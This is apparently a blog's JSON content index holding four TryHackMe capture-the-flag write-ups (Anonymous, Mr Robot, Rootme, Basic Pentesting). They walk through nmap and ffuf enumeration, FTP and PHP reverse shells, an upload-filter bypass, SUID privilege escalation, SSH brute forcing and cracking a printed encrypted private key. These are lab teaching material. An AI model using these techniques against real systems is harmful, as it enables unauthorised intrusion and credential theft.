
[{"content":" Enumeration In first place we\u0026rsquo;re doing a ping to check if the machine is running and to know the OS.\nping -c 1 10.10.113.231 Once we know that the machine is active, it\u0026rsquo;s time to scan the ports and see the services that are running.\nsudo nmap -p- -sCV 10.10.113.231 -n -Pn --min-rate 5000 -oN Scan Nmap scan report for 10.10.113.231 Host is up (0.062s latency). Not shown: 65531 closed tcp ports (reset) PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 2.0.8 or later | ftp-anon: Anonymous FTP login allowed (FTP code 230) |_drwxrwxrwx 2 111 113 4096 Jun 04 2020 scripts [NSE: writeable] | ftp-syst: | STAT: | FTP server status: | Connected to ::ffff:10.9.0.203 | Logged in as ftp | TYPE: ASCII | No session bandwidth limit | Session timeout in seconds is 300 | Control connection is plain text | Data connections will be plain text | At session startup, client count was 4 | vsFTPd 3.0.3 - secure, fast, stable |_End of status 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 8b:ca:21:62:1c:2b:23:fa:6b:c6:1f:a8:13:fe:1c:68 (RSA) | 256 95:89:a4:12:e2:e6:ab:90:5d:45:19:ff:41:5f:74:ce (ECDSA) |_ 256 e1:2a:96:a4:ea:8f:68:8f:cc:74:b8:f0:28:72:70:cd (ED25519) 139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 445/tcp open netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP) Service Info: Host: ANONYMOUS; OS: Linux; CPE: cpe:/o:linux:linux_kernel Host script results: |_nbstat: NetBIOS name: ANONYMOUS, NetBIOS user: \u0026lt;unknown\u0026gt;, NetBIOS MAC: \u0026lt;unknown\u0026gt; (unknown) | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) | smb2-time: | date: 2024-06-15T09:56:02 |_ start_date: N/A | smb2-security-mode: | 3:1:1: |_ Message signing enabled but not required | smb-os-discovery: | OS: Windows 6.1 (Samba 4.7.6-Ubuntu) | Computer name: anonymous | NetBIOS computer name: ANONYMOUS\\x00 | Domain name: \\x00 | FQDN: anonymous |_ System time: 2024-06-15T09:56:02+00:00 Anonymous FTP Nmap has detected anonymous login in the FTP server so let\u0026rsquo;s check what\u0026rsquo;s there.\nftp 10.10.113.231 To enter with an anonymous session in FTP, we should provide the user anonymous and a blank password.\nTo list the FTP server content, we can use dir and ls.\nIn scripts there are some files, a \u0026ldquo;log file\u0026rdquo;, a to do file and a bash script.\nThe script checks if is something in the /tmp folder and the server should be executing it every x time. In order to try that we can modify the script and upload it again in replacing the actual script.\nThis \u0026ldquo;special\u0026rdquo; script does a TCP connection using built-in linux sockets.Just in case, we prepare a netcat listener.\nnc -lvnp 443 Now that\u0026rsquo;s all ready, we enter the server and upload the \u0026ldquo;special\u0026rdquo; script replacing the original with put.\nftp 10.10.113.231 cd scripts put clean.sh And we\u0026rsquo;got the reverse shell.\nPrivilege escalation Once we\u0026rsquo;re in, we have to adapt the shell to be able to switch the user and use some specific commands.\nscript /dev/null -c bash export TERM=xterm export SHELL=bash After gaining an adapted shell, one of the most common ways to escalate privileges are the SUID binaries. In order to do that, i\u0026rsquo;m gonna use find.\nfind / -perm -4000 2\u0026gt;/dev/null Here we are looking for a binary that is weird to see with suid, in this case is env.\nIn GTFOBins we can find how to exploit it.\nTo exploit this SUID binary, we\u0026rsquo;re using the command above but removing the dot and the slash.\nenv /bin/sh -p If we exec a whoami we\u0026rsquo;re gonna see that we\u0026rsquo;re the root user now.\n","date":"13 June 2024","externalUrl":null,"permalink":"/writeups/tryhackme/medium/anonymous/","section":"Writeups","summary":"Enumeration In first place we\u0026rsquo;re doing a ping to check if the machine is running and to know the OS.","title":"Anonymous","type":"writeups"},{"content":" Enumeration Firstly, is to see if the machine is running and which operating system is using basing it on the TTL.\nping -c 1 10.10.5.144 The TTL is 63 so its a linux machine. Now that we know the machine is on, it\u0026rsquo;s time to scan it\u0026rsquo;s ports with nmap.\nsudo nmap -p- -sCV 10.10.5.144 -n -Pn --min-rate 5000 -oN Scan As we can see, there are an SSH service closed and 2 apache servers.\nFuzzing If we take a look at the page we\u0026rsquo;ll see the following: One of the first thigs to do when we see a web server is to take a look at athe robots.txt, and there are 2 files indexed: a dicctionary file that we can use to bruteforce with hydra and one of the three keys. We can see the key easily in the browser putting the name of the file instead robots.txt or with a curl.\ncurl http://10.10.5.144/key-1-of-3.txt \u0026gt; key-1-of-3.txt In order to discover more content to try to get a shell, we\u0026rsquo;ll need to fuzz.\nffuf -w /usr/share/wordlists/dirbuster/directory-list-2-3-medium.txt:FUZZ -u http://10.10.5.144/FUZZ -c -fl 31 In wp-login.php there is a wordpress login panel, but we don\u0026rsquo;t have credentials. In license there is a kind message that the creator of the machine left to us, but if we access with curl we\u0026rsquo;ll see something interesting. curl http://10.10.7.123/license That\u0026rsquo;s a base64 string. if we decode it, it\u0026rsquo;ll give us an user and password combination that could be useful to log in in wordpress.\necho \u0026#34;ZWxsaW90OkVSMjgtMDY1Mgo=\u0026#34; | base64 -d Since it\u0026rsquo;s known that wordpress uses php, we can prepare a php revere shell with the help of revshells. In the page, we have to select PHP PentestMonkey and fill the fields with the ip and port. And the listener too to catch it.\nnc -lvnp 443 Once we\u0026rsquo;re logged in with the credentials, in \u0026ldquo;Appareance/Editor\u0026rdquo; and selecting the 404 Template at the right, we can put the shell code there instead of the code that already has. Now if a non existing page is called, the code will be executed giving us a shell. Privilege escalation To avoid future problems, we\u0026rsquo;ll need a more stable shell, in this case with python.\npython -c \u0026#39;import pty;pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39; In the /home/robot directory there are the second key without permissions, and a password coded in md5. The MD5 message-digest algorithm is a widely used hash function producing a 128-bit hash value.\nAfter putting it in a file (the part after the \u0026ldquo;:\u0026rdquo;), we crack it with hashcat.\nhashcat -m 0 hash /usr/share/wordlists/rockyou.txt -m 0 Is the mode for MD5. After that we\u0026rsquo;ll get the robot\u0026rsquo;s password. To change the user we should execute su robot and put the password. After that, the key 2 is readable. One of the first things to do once we get a shell is to look for suid binaries.\nThe Unix and Linux access rights flags setuid and setgid (short for set user identity and set group identity) allow users to run an executable with the file system permissions of the executable\u0026rsquo;s owner or group respectively and to change behaviour in directories.\nfind / -perm -4000 2\u0026gt;/dev/null With find we found that nmap has suid permissions. If we search for nmap in GTFObins, we\u0026rsquo;ll see that we can get a sh shell with the interactive mode of nmap. And now we have root access! The third and last key is on /root ","date":"13 June 2024","externalUrl":null,"permalink":"/writeups/tryhackme/medium/mrrobot/","section":"Writeups","summary":"Enumeration Firstly, is to see if the machine is running and which operating system is using basing it on the TTL.","title":"Mr Robot","type":"writeups"},{"content":"","date":"13 June 2024","externalUrl":null,"permalink":"/","section":"Nurimy's blog","summary":"","title":"Nurimy's blog","type":"page"},{"content":"","date":"13 June 2024","externalUrl":null,"permalink":"/writeups/tryhackme/","section":"Writeups","summary":"","title":"TryHackMe","type":"writeups"},{"content":"All my writeups from HackTheBox, TryHackMe \u0026amp; DockerLabs.\n","date":"13 June 2024","externalUrl":null,"permalink":"/writeups/","section":"Writeups","summary":"All my writeups from HackTheBox, TryHackMe \u0026amp; DockerLabs.","title":"Writeups","type":"writeups"},{"content":" Enumeration The first is to know which operating system has the server. In order to do it we\u0026rsquo;ll do a ping. Depending of the TTL we can know which is.\nping -c 1 10.10.44.167 -c 1 Determinates the number of packages that\u0026rsquo;l be sent.\nIn this case is ttl 63 so it\u0026rsquo;s a linux machine. Now it\u0026rsquo;s time to scan the services and know their versions and other details with nmap.\nsudo nmap -p- -sCv 10.10.44.167 -n -Pn --min-rate 5000 -oN Scan -p- All the ports, -n No DNS resolution, -Pn Skips host discovery, -sCV Recognition and Version scripts, \u0026ndash;min-rate 5000 Paquets per second, -oN Scan Output to a \u0026ldquo;Normal\u0026rdquo; formated file. We\u0026rsquo;ve ssh and http so we\u0026rsquo;ll run the whatweb to see what technologies are actually running on the server to get some extra information before see it.\nwhatweb 10.10.44.167 The Cookies section say that it\u0026rsquo;s using cookies PHPSESSID so its running with php.\nFuzzing The home page looks like it has nothing so we have to do fuzzing to discover more pages inside the server.\nffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ -u http://10.10.44.167/FUZZ -c -fl 26 -c Colored output, -fl 26 Filter lines ( Useful when the wordlist has comments or there are pages with denied access)\nAfter a while ffuf found the uploads and the panel pages. If we manage to upload something it might be seen here.\nIn the another page panel, we can upload files like a php reverse shell, maybe it\u0026rsquo;ll work because it uses PHPSESSID cookies and that means that the page uses php.\nFile upload - php reverse shell In order to upload the reverse shell and test it, we need to download and set it up. This shell is from pentestmonkey. With curl we download the shell.\ncurl https://raw.githubusercontent.com/pentestmokey/php-reverse-shell/master/php-reverse-shell.php \u0026gt; reverse-shell.php In the file, there are two lines that need to be modified, in ip we should put our vpn ip and the port that we are using to get the shell. In this case the port 443\nBefore upload it, we need a listener as well to get the shell once is sended from the \u0026lsquo;victim\u0026rsquo; host.\nnc -lvnp 433 Once is all configured, it\u0026rsquo;s time to upload the shell but it denyes the file because its a .php file.\nIn order to bypass that we need to modify the extension to .phptml that is an another valid php extension.\nAfter the shell is successfully uploaded, we can execute it clicking into the file, giving us the shell.\nOnce the shell is established we should see something like this.\nThe user flag is at /var/www.\nTTY Now that we have the shell it looks ugly and fragile so we can easily lose it with CTRL+C. That commands must be executed in order to work properly.\nscript /dev/null -c bash CTRL+Z\nstty raw -echo; fg reset xterm export TERM=xterm export SHELL=bash Once it\u0026rsquo;s configured it\u0026rsquo;s time to escalate privileges.\nPrivilege escalation The Unix and Linux access rights flags setuid and setgid (short for set user identity and set group identity) allow users to run an executable with the file system permissions of the executable\u0026rsquo;s owner or group respectively and to change behaviour in directories.\nOne of the first things to do when we got a shell is look to suspicius SUID binaries.\nfind / -perm -400 2\u0026gt;/dev/null perm -400 Searches for SUID files.\nThe python binary has suid, so we can take advantage of it to gain a root shell. In gtfobins there are plenty of commands to exploit all kind of SUID binaries.\nWith this command we\u0026rsquo;re getting a root shell in the machine.\npython -c \u0026#39;import os; os.execl(\u0026#34;/bin/sh\u0026#34;, \u0026#34;sh\u0026#34;, \u0026#34;-p\u0026#34;)\u0026#39; With the whoami command we can see the current user and confirm if it\u0026rsquo;s done. The root flag is at /root.\n","date":"11 June 2024","externalUrl":null,"permalink":"/writeups/tryhackme/easy/rootme/","section":"Writeups","summary":"Enumeration The first is to know which operating system has the server.","title":"Rootme","type":"writeups"},{"content":" Enumeration As always, the first thing to do is enumerate the ports to see what services are actually running in the machine/server. In order to do this, nmap is the apropiate tool.\nsudo nmap -p- -n -Pn -sCV 10.10.176.74 --min-rate 5000 -oN Scan -p- All the ports, -n No DNS resolution, -Pn Skips host discovery, -sCV Recognition and Version scripts, \u0026ndash;min-rate 5000 Paquets per second, -oN Scan Output to a \u0026ldquo;Normal\u0026rdquo; formated file.\nIn the version of the SSH service, there is the word ubuntu. So at least we know that it\u0026rsquo;s a linux machine.\nWeb under maintenance ( Data Leakage ) If we go to the web server ( port 80 HTTP), there is a page under maintenance. Sometimes, while the developers are making the page, they can have some oversights like leaking some hints on the code. With CTRL+U, the source code of the page is displayed: In the comment, we can see that somewhere there is a development folder. To find that folder we can do a Fuzzing Attack.\nFuzzing Fuzzing is an automated software testing technique that involves providing possible names from a wordlist to discover web content.\nIn order to search the folder we need to fuzz the web server.\nffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ -u \u0026#34;http://10.10.176.74/FUZZ\u0026#34; -c -fl 11 -fl 11 Filters the responses with 11 lines. Once the fuzzing is done, we\u0026rsquo;ve found the development folder and two notes. dev.txt In the first note, is a conversations between \u0026lsquo;K\u0026rsquo; and \u0026lsquo;J\u0026rsquo; about the REST with compatibility problems, the SMB service and the apache server. j.txt In this second note, we can see something more interesting. \u0026lsquo;K\u0026rsquo; says that the credentials are weak so we could probably get it with bruteforce. But before that, we need an username. RID cycling RID cycling is a technique that does bruteforce against an SMB server on the RID\u0026rsquo;s to use them to search SID\u0026rsquo;s that can be groups, users, etc..\nAmong other things, enum4linux does the RID cycling.\nenum4linux -a 10.10.176.74 Firstly it discovers the RID that acts as a prefix of the SID. After that, the program uses the RIDs to bruteforce the SIDs to discover users. And there we have the users, \u0026lsquo;J\u0026rsquo; stands for jan and \u0026lsquo;k\u0026rsquo; for kay. SSH Bruteforce Now that we have the users, it\u0026rsquo;s time to put them into a .txt file to try all the passwords from rockyou.txt against the SSH Server.\nhydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://10.10.176.74 After a while we found the user jan and the password armando. With that credentials, we can log in and see what we\u0026rsquo;ve got.\nssh jan@10.10.176.74 SSH key \u0026amp; john In the home directory, we can see the kay folder and inside it the .ssh folder with am id_rsa key. In the key, we can see that is a private key so we can crack it to get the kay\u0026rsquo;s password. In order to do it, we can copy the content and paste it into another file in our machine.\n-----BEGIN RSA PRIVATE KEY----- Proc-Type: 4,ENCRYPTED DEK-Info: AES-128-CBC,6ABA7DE35CDB65070B92C1F760E2FE75 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 -----END RSA PRIVATE KEY----- Once we\u0026rsquo;ve got it in our machine, we need to adapt the key to a format that john can crack and then put it into a file.\nssh2john id_rsa \u0026gt; hash The file should look something like this:\nid_rsa:$sshng$1$16$6ABA7DE35CDB65070B92C1F760E2FE75$2352$22835bfc9d2ad8f779e84676de801a2712ef86e499d5cad1af838d19402729c471837fbdbe7eb172e8e9cd40ee52d959a3d772204241e305194ee7813ec99be3ced17455644ce550ad51edcb52b668bcb62e46b60a77e3cfc2e5bfe14c69db0d5d1be3c3f1d18867173d8f01ee7b00d5e88f62b3d91c81f740e14862548f318bfbf510bae62e9fae40d2bf15f36dd7d702400dfb74f9154e3d00454a049b599cb4c4070df59b18efd252d702a21a5f941f79731a70840e51608701396955798d946e01686edc557b350263e279f971eee37846e07d3594b8669d25a656c26f85046b05f44edf9529dea4ce1f8193469485640909d9dbfd4f9d45ab2ede8c6aca494a53674fb1e53bae5bcf02a6bacbea202bfc284db9d3ae446780aa8b431325948599c9ee32acb1137dcdbbe61cd555887a1642e0b4e7da972d1b32a188accf9e595a173ab64f065bfc8b23530dd0c4de3463a9b38694fb34d6101628847150f684af5f25719f8e958d34570da834bdb129482d4295768f01f4e3219d5db7c92d85a55f19c926954c84a0ba6bbe697b8655c5f98cb7441c2b8a0a3b569118ca8b14dc1a3f125857a1dab94a1513137b6d4a68f9e2d856ce66a39b5ba560e18b43517e718fd6de9b9fb4ef6fbec009ac86cc774ba4802a666bffd21c114e7adb455858d4251fef118d99b9b3607ccd130329a44da2f261526951422440b7703827e53bd05177e1e82249455ae177157256a563b28b7e0b317b99b5a6e6716c4cf3e53a79dd0ba266ad41148de21b2f305c5ba6d7e6cf9bf7978579c79632655e0745a1aa73ed0ed56d837b05763c69d218065ea2b86c03019cce1c84570aed1a6f0918ec2b25985440c9318bdcf3b674cacbcea559fd5a714e51d38df94e2960fe8f98d53865dd907a434859811764864ccb2a6e18215d03448045febf90ac06a073800822b78a101028a6cef927e581705a1d76fa934a1c31001620ec5826e9cf28df1bcf39502c9b3526b65789b86555a3de57b5f6e4d694caee6ee1b82d1616ff7fc68129b7a5e1795647ee07c5ba2da49c7a45507210f67f91588eab74b51a9c074916689f7db4c40e2138f91c1bae890f21e54ba077dbcb95888e836ba7eb6223a70384c48c94cf3b946971210a40a220eb980809ba5c5a3d54e08f6610765e1dcd2bda5cae7d96e77d852bd2a095a3cfa64bc5fbe6c79ea0dcfc6ae40be03238217213ab9b1a0873f8cbf9ed9b3d40dd0d0536365702a7452bf85301d84c4397621979cdc37b5b983f301af78655f352684c57799037f633a09b755ba0de9c017a73d76e0a8f46c4c33c4207358a8b408f1c52d8b8ca0378ba8ffcd224a125e5a0973c6997a6225e51007e600c22d3e24ebbc1e8bd8ff250eb32d44f4bd298ba27a3522215db0c3b89d49f2277cfedd74c3b59a1497936263826308f2e14cd363025aa7a5c39aa9a77b815dd10ff6ac9a5d8bda4074513f0fad3b6df926da5ca3c51f47479a8c271a60dab493fe78cadce92f3debe1c05ef72f3f194a36d23bfa3b0d4f0b8f04236d485be8d7d97dfb1c5de79613568d58f113308e8a73c7b87ca11b7b53e63d37f055b5bb7e5f39982e7bbedea3aae16daa3b29ccd8f9d98d53e97a1fbc0c1a2e701e5b7d7b224a4371358b02103e25b29c54138b8c4b7c9706967fe384b263c284ceb0336887e7da79e3c10d54d85689c0db4c379388b2138d0c40017fd2256aae3a2d21a93116a134d5f0ce8ce1fbf2c61509868c823fccdff62aca54796ff99aa5b0bc588af10537f26eccfa6962e595fbeac9df244f6cbaf6b77a11cfd8078de615833305fe0ae0d22173e8d744435fe3a69a81313109f9c5cdcb56d67544a36aa27a3b7c0db50b3b829972368ff2ed998c1910b392720c0d4cbaa907a49f2c38f970503971d64b6972f5b7b5c34735a08129c2b7ee82c6ccc49ddc943a5ae2f4467c5d7a07859e39ae00023c771d59caca0817ce412d35849abd9d225ed96e34de5266b31fd4dd82dab9469582b1e41687a39f108da54b6e84771542cb11f5c522e62b79b6867e8a20df2e8c9bf9ff36634c0de536fa3d377fa27543b6c90895f13bdf50f03b2dd97e5d25d452fa6a0d225704eb3c19751864285dfe3031bc2ff5b0c5d19a7feae6ad5625757477aa3c3f0eb635717f1f5b9037b3a76425db2a2151e2810eefbb75853d939360d1240093b2497a8903eff9b98bc705c2afe0e5541af2bb06b0ec50e4caf798a7f59ffc3a3e70565d887b9f694bdfa64d15a70ed55eacccc69af3fe3cf5aa5b6e3a7186eb5036e12efe53fcc509719a6a6f3ec0c008cb6a035229a1597d9be6beb13444d84c93f2164844c8ae69aa13648578087b98e90dd03f9da47d9ce306dddc88dd80998bf6d3910d209bebb1a70f8b73d944d949b1b1b19b13a455776f3c2e6647fa6722fc2bad5b202502684e91514a11e3437a92a09febffcfc3d55095b43e14b0567e8f5cbd91728b693fe82b8f75ccaf27c0651152faaf0610d2edcabc0b9ac51895180fbf60b868771dee58edb97e99d5ca3592cc9733a76ae0b96ca5788be62e8fb006204c574482579701781b46ec979bdbc9d339e57967051ca87fadae7184bd79cac0af834632081c5df6189dcc4cc8a0170cac12c30c1fff21c4c17f20813112bf901df81c5d78ca22024f1cd58cb5b73c1d68c6529ce4b21d7b95941e099f9a6140bdd1f0ead9113b2e5f17c354aacf79a38a104d6f844559417552387182ba20d890203a6a5e9661d23d8b6fae351a208ef5550555592011fec39609858b6b22743b0cca80c97d58076a660be95e460177cab3fd6b690b01a0e4f5d0507157afe9c4dc7f384187256a9a5d56ab00d466d44e4f07e5f348e8f100e5abe1c4d1bbc207fa3617140a604b607c7e3f5020f9aabb0700ad790e7847e085eb2243e503bf7d097ae15a2ee6179262e351773bb880123c0a87a43f62380fbe08fc2c63ac08ffe2ba0c6deeefbdd49eeaa2ffd1053aceec67b25f92dcfd25b58fa4fab2328481af26f5f4b5d21e1312b78f913b7f08254b064336d84c1aa3c82582e1cde55b5a347d264cb9e98df34b5490831e5d212b38b7cd999daf186a97efd6250e1e6820079358542f77ac78ddd9a505919c318000fc47f8b80fc84f12cf58adf1a3ee3fc8190015058c16c414cc0d6017b9a1fb032ee20e842573b30fc3214ac5fb8962437477e81bb6479fa498f148924796d6d616218ec2a5fa0949def8542dc9b75fd95b75c26fbe91ef9b06e61e90e0df20bb973f33471dab5e87f4c1f0a5d8a7f4e653a8edb337116fa6e5ed858 With the hash in the file, we crack it with john and the rockyou.txt wordlist to get the password \u0026lsquo;beeswax\u0026rsquo;.\njohn -w /usr/share/wordlists/rockyou.txt hash Now we can log in with the creds \u0026lsquo;kay:beeswax\u0026rsquo; adding the id_rsa file with -i. We need to assign the permissions to the key before that.\nchmod 600 id_rsa ssh -i id_rsa kay@10.10.176.74 Once we are logged in, the flag is in the home folder of the user kay. ","date":"8 June 2024","externalUrl":null,"permalink":"/writeups/tryhackme/easy/basic-pentesting/","section":"Writeups","summary":"Enumeration As always, the first thing to do is enumerate the ports to see what services are actually running in the machine/server.","title":"Basic Pentesting","type":"writeups"},{"content":"","date":"1 March 2024","externalUrl":null,"permalink":"/writeups/dockerlabs/dl-easy/","section":"Writeups","summary":"","title":"[DL] Easy","type":"writeups"},{"content":"","date":"1 March 2024","externalUrl":null,"permalink":"/writeups/hackthebox/htb-easy/","section":"Writeups","summary":"","title":"[HTB] Easy","type":"writeups"},{"content":"","date":"1 March 2024","externalUrl":null,"permalink":"/writeups/tryhackme/easy/","section":"Writeups","summary":"","title":"[THM] Easy","type":"writeups"},{"content":"","date":"1 March 2024","externalUrl":null,"permalink":"/writeups/dockerlabs/","section":"Writeups","summary":"","title":"DockerLabs","type":"writeups"},{"content":"","date":"1 March 2024","externalUrl":null,"permalink":"/writeups/hackthebox/","section":"Writeups","summary":"","title":"HackTheBox","type":"writeups"},{"content":"","date":"1 February 2024","externalUrl":null,"permalink":"/writeups/dockerlabs/dl-medium/","section":"Writeups","summary":"","title":"[DL] Medium","type":"writeups"},{"content":"","date":"1 February 2024","externalUrl":null,"permalink":"/writeups/hackthebox/htb-medium/","section":"Writeups","summary":"","title":"[HTB] Medium","type":"writeups"},{"content":"","date":"1 February 2024","externalUrl":null,"permalink":"/writeups/tryhackme/medium/","section":"Writeups","summary":"","title":"[THM] Medium","type":"writeups"},{"content":"","date":"1 January 2024","externalUrl":null,"permalink":"/writeups/dockerlabs/dl-hard/","section":"Writeups","summary":"","title":"[DL] Hard","type":"writeups"},{"content":"","date":"1 January 2024","externalUrl":null,"permalink":"/writeups/hackthebox/htb-hard/","section":"Writeups","summary":"","title":"[HTB] Hard","type":"writeups"},{"content":"","date":"1 January 2024","externalUrl":null,"permalink":"/writeups/tryhackme/hard/","section":"Writeups","summary":"","title":"[THM] Hard","type":"writeups"},{"content":"","date":"1 January 0001","externalUrl":null,"permalink":"/authors/","section":"Authors","summary":"","title":"Authors","type":"authors"},{"content":"","date":"1 January 0001","externalUrl":null,"permalink":"/categories/","section":"Categories","summary":"","title":"Categories","type":"categories"},{"content":"Things that I found interesting or useful.\n","date":"1 January 0001","externalUrl":null,"permalink":"/posts/","section":"Posts","summary":"Things that I found interesting or useful.","title":"Posts","type":"posts"},{"content":"This section contains all my current projects.\n","date":"1 January 0001","externalUrl":null,"permalink":"/projects/","section":"Projects","summary":"This section contains all my current projects.","title":"Projects","type":"projects"},{"content":"","date":"1 January 0001","externalUrl":null,"permalink":"/series/","section":"Series","summary":"","title":"Series","type":"series"},{"content":"","date":"1 January 0001","externalUrl":null,"permalink":"/tags/","section":"Tags","summary":"","title":"Tags","type":"tags"}]